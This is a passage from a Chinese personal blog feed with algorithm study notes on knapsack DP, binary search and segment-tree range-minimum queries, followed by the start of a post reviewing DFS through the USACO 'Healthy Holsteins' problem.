class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v  = w[i], v &lt;= V; v++)&#123;</span><br><span class="line">dp[v] = <span class="built_in">max</span>(dp[v],dp[v-w[i]]+c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="状态压缩dp"><a class="markdownIt-Anchor" href="#状态压缩dp">#</a> 状态压缩 DP</h2><p>这里讲一个之前某蓝桥杯用到的算法，虽然很容易爆内存，但是有些实在没有思路的题可能用一下也是可以的。</p><h1 id="扩展的一些算法或者数据结构"><a class="markdownIt-Anchor" href="#扩展的一些算法或者数据结构">#</a> 扩展的一些算法或者数据结构</h1><h3 id="二分"><a class="markdownIt-Anchor" href="#二分">#</a> 二分</h3><h4 id="二分查找"><a class="markdownIt-Anchor" href="#二分查找">#</a> 二分查找</h4><p>首先肯定是最经典的 <strong>从有序数组中查找某个值</strong>。</p><blockquote><p>给定长度为 n 的单调不下降数列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span> 和一个数 k，求满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> &gt;= k 条件的最小 i。不存在的情况下输出 n。</p></blockquote><p>当然，可以朴素地按照顺序逐个查找。但是如果利用二分地算法可以降低到 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">log_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) 的时间复杂度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"><span class="type">int</span> a[MAX_N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> lb = <span class="number">-1</span>, ub =n;</span><br><span class="line"><span class="keyword">while</span>(ub - lb &gt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> mid = (lb + ub) /<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(a[mid] &gt;= k)&#123;</span><br><span class="line">ub = mid;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">lb =mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ub);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种算法被称为二分搜索。此外 STL 以 lower_bound 函数的形式也实现了二分搜索。<br>下面还有一道题，刚看到时总感觉手足无措，感觉暴力不行又没有其他办法，这时使用二分能很好地解决问题。</p><blockquote><p>有 N 条绳子，长度分别为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。如果从他们中切割出 K 条长度相同的绳子的话，这 K 条绳子每条最长能有多长？答案保留小数点后 2 位。</p></blockquote><p>让我们试着套用二分搜索的模型解决这个问题：条件 C (x):= 可以得到 K 条长度为 x 的绳子。<br>则问题变成了满足 C (x) 的条件的最大 x。在区间初始化时，只需要充分大的数 INF 作为上界即可: lb =0,ub = INF<br> 现在的问题是是否可以高效判断 C (x)。由于长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的绳子最多可以切除 floor (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> /x) 段长度为 x 的绳子，因此：C (x) = floor (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">L_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>/x) 的总和是否大于等于 k。 者可以在 O (n) 的时间内被判断出来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> N,k;</span><br><span class="line"><span class="type">double</span> L[MAX_N];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">C</span><span class="params">(<span class="type">double</span> x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;N; i++)&#123;</span><br><span class="line">num += (<span class="type">int</span>)(L[i] / x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> num&gt;=K;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">double</span> lb =<span class="number">0</span>, ub =INF;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line"><span class="type">double</span> mid = (lb + ub) /<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">C</span>(mid)) lb = mid;</span><br><span class="line"><span class="keyword">else</span> ub = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>,<span class="built_in">floor</span>(ub*<span class="number">100</span>)/<span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线段树"><a class="markdownIt-Anchor" href="#线段树">#</a> 线段树</h3><p>线段树是擅长处理区间的，形如下图的数据结构。线段树是一棵完美二叉树，（所有叶子的深度都相同，每个系欸但要不是叶子要么是有两个儿子的树），树上的每个节点都维护一个子区间。当有 n 个元素时，对区间的操作可以在 O (log n) 的时间内完成。<br><img src="https://raw.githubusercontent.com/dagzi1231/imagestorage/b9730e494d8c042cda559ccf4eace3c9bed4d449/img/20200212110638812.png" alt="线段树演示"><br>根据节点中维护的数据的不同，线段树可以提供不同的功能。下面实现了基于 RMQ 操作的线段树。</p><h4 id="基于线段树的rmq结构"><a class="markdownIt-Anchor" href="#基于线段树的rmq结构">#</a> 基于线段树的 RMQ 结构</h4><p>下面要建立的线段树在给定数列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>, 的情况下，可以在 O (log n) 时间内完成如下两种操作</p><ul><li>给定 s 和 t，求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">a_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>s</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{s+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>,…,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">a_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最小值</li><li>给定 i 和 x，把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, 的值改成 x<br> 如下图，线段树的每个节点维护对应区间的最小值。在建树时，只需要按从下到上的顺序分别取左右儿子的值中较小者就可以了。</li></ul><h4 id="基于线段树的rmq查询"><a class="markdownIt-Anchor" href="#基于线段树的rmq查询">#</a> 基于线段树的 RMQ 查询</h4><p>如果要求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">a_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,…,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>6</mn></msub></mrow><annotation encoding="application/x-tex">a_6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最小值。我们只需要求出下图中的三个节点的值的最小值即可。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
            <tag> 学习 </tag>
            
            <tag> 最小生成树 </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DFS--复习</title>
      <link href="/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>先上题目：</p><hr><h1 id="usaco21-健康的荷斯坦奶牛-healthy-holsteins"><a class="markdownIt-Anchor" href="#usaco21-健康的荷斯坦奶牛-healthy-holsteins">#</a> [USACO2.1] 健康的荷斯坦奶牛 Healthy Holsteins</h1><h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述">#</a> 题目描述</h2><p>农民 John 以拥有世界上最健康的奶牛为傲。他知道每种饲料中所包含的牛所需的最低的维他命量是多少。请你帮助农夫喂养他的牛，以保持它们的健康，使喂给牛的饲料的种数最少。</p><p>给出牛所需的最低的维他命量，输出喂给牛需要哪些种类的饲料，且所需的饲料剂量最少。</p><p>维他命量以整数表示，每种饲料最多只能对牛使用一次，数据保证存在解。</p><h2 id="输入格式"><a class="markdownIt-Anchor" href="#输入格式">#</a> 输入格式</h2><p>第一行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>，表示需要的维他命的种类数。<br>第二行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 个整数，表示牛每天需要的每种维他命的最小量。</p><p>第三行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span>，表示可用来喂牛的饲料的种数。<br>下面 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span> 行，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 行表示编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 饲料包含的各种维他命的量的多少。</p><h2 id="输出格式"><a class="markdownIt-Anchor" href="#输出格式">#</a> 输出格式</h2><p>输出文件只有一行，包括牛必需的最小的饲料种数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>；后面有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span> 个数，表示所选择的饲料编号（按从小到大排列）。</p><p>如果有多个解，输出饲料序号最小的（即字典序最小）。</p><h2 id="样例-1"><a class="markdownIt-Anchor" href="#样例-1">#</a> 样例 #1</h2><h3 id="样例输入-1"><a class="markdownIt-Anchor" href="#样例输入-1">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">100 200 300 400</span><br><span class="line">3</span><br><span class="line">50  50  50  50</span><br><span class="line">200 300 200 300</span><br><span class="line">900 150 389 399</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a class="markdownIt-Anchor" href="#样例输出-1">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 1 3</span><br></pre></td></tr></table></figure><h2 id="提示"><a class="markdownIt-Anchor" href="#提示">#</a> 提示</h2><p>【数据范围】<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>v</mi><mo>≤</mo><mn>25</mn></mrow><annotation encoding="application/x-tex">1\le v \le 25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>g</mi><mo>≤</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">1\le g \le 15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">5</span></span></span></span>。<br>输入的所有整数在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">]</span></span></span></span> 范围内。</p><p>USACO 2.1</p><p>翻译来自 NOCOW</p><h2 id="题解"><a class="markdownIt-Anchor" href="#题解">#</a> 题解</h2><p>太长时间没有刷题，一些简单的深搜也不太会写了。这题不用剪枝直接暴力即可。<br>每个饲料只有 0，1 两种状态（要或者不要）<br>然后 search (t,s)<br> t 代表选中的饲料，s 代表选中饲料的个数，要么 search (t+1,s) 当前饲料不选，要么 search (t+1,s+1)<br> 选当前饲料，数据量小直接就能 AC</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span 